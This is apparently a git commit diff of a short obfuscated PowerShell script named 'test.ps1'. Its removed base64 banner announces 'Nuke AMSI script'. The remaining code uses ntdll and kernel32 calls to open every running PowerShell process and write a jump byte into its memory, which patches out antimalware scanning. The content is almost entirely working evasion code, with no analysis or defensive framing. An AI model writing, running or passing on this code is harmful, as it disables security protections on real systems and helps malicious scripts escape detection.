25904a9dc5f15de25baf2a975c791b007ebf7258
Fyxs1 <72049952+Fyxs1@users.noreply.github.com>
2025-07-03 15:59:41 +0530

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,5 +1,4 @@
-$B=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VwByAGkAdABlAC0ASABvAHMAdAAgACIAUwB0AGEAcgB0AGkAbgBnACAATgB1AGsAZQAgAEEATQBTAEkAIABzAGMAcgBpAHAAdAAuAC4ALgAiACAA
-LQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAEMAeQBhAG4A'));iex $B;$C=Read-Host "Are you ready?";Add-Type -Ty @"
+$null=Read-Host "";Add-Type -TypeDefinition @"
 using System;using System.Diagnostics;using System.Runtime.InteropServices;
 public class T{public const int A=0x8,B=0x10,C=0x20;public const uint D=0x40;
 [DllImport("ntdll.dll")]public static extern int NtOpenProcess(out IntPtr E,uint F,[In]ref G H,[In]ref I J);
@@ -10,7 +9,6 @@ public class T{public const int A=0x8,B=0x10,C=0x20;public const uint D=0x40;
 [DllImport("kernel32.dll",SetLastError=true)]public static extern bool VirtualProtectEx(IntPtr T,IntPtr U,UIntPtr V,uint W,out uint X);
 [StructLayout(LayoutKind.Sequential)]public struct G{public int Y;public IntPtr Z,A,B;public IntPtr C,D;}
 [StructLayout(LayoutKind.Sequential)]public struct I{public IntPtr E,F;}}"@
-
 function p{param([int]$x)
 $y=[byte]0xEB;$z=New-Object T+G;$a=New-Object T+I;$a.E=[IntPtr]$x;$a.F=[IntPtr]::Zero;$z.Y=[Runtime.InteropServices.Marshal]::SizeOf($z)
 $b=[IntPtr]::Zero;$c=[T]::NtOpenProcess([ref]$b,[T]::A -bor [T]::B -bor [T]::C,[ref]$z,[ref]$a);if($c -ne 0){return}
@@ -20,6 +18,4 @@ $f=[IntPtr]($e.ToInt64()+3);$g=[UInt32]0;$h=[UIntPtr]::new(1)
 $i=[T]::VirtualProtectEx($b,$f,$h,[T]::D,[ref]$g);if(-not $i){[T]::NtClose($b);return}
 $j=[UInt32]0;$k=[T]::NtWriteVirtualMemory($b,$f,[byte[]]@($y),1,[ref]$j)
 $l=[T]::VirtualProtectEx($b,$f,$h,$g,[ref]$g);[T]::NtClose($b)}
-
-function q{Get-Process|?{$_.ProcessName -eq "powershell"}|%{p -x $_.Id}}
-q
+function q{Get-Process|?{$_.ProcessName -eq "powershell"}|%{p -x $_.Id}};q
